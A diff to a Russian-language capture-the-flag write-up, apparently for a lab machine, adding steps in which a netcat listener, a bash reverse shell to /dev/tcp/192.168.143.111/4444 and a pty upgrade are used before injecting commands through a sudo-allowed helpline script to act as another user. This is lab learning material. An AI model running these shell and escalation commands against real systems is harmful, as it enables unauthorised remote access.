@@ -50,12 +50,38 @@ sudo -u apaar /home/apaar/.helpline.sh
 ```
 да файл создался 
 <img width="717" height="142" alt="Снимок экрана 2026-05-01 в 09 15 19" src="https://github.com/user-attachments/assets/48d4b114-2f7d-4487-b0f9-941cc944d93f" />
+```
+nc -lvnp 4444
+```
+```
+\bash -c "bash -i >& /dev/tcp/192.168.143.111/4444 0>&1"
+```
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+```
+export TERM=xterm
+```
+```
+sudo -u apaar /home/apaar/.helpline.sh
+```
+```
+www-data@ip-10-129-174-197:/$ sudo -u apaar /home/apaar/.helpline.sh
+sudo -u apaar /home/apaar/.helpline.sh
+
+Welcome to helpdesk. Feel free to talk to anyone at any time!
+
+Enter the person whom you want to talk with: t
+t
+Hello user! I am t,  Please enter your message: touch /tmp/aprtest.txt
+touch /tmp/aprtest.txt
+Thank you for your precious time!
+-rw-rw-r--  1 apaar    apaar       0 May  1 06:40 aprtest.txt
+```
 
 
 
-
-
-= Не удачные векторы =
+= Неудачные векторы =
 #### Попытка изменить index.php - стоило сразу прочитать разрешения файла -rw-r--r-- 1 - кроме рут никто сюда не пишет
 #### Попытка создать файл в папке secret также не увеначались успехом тк создавать файл я не могу 
 #### Попытка загрузить файл с реверс шеллом на сайт через свой сервер
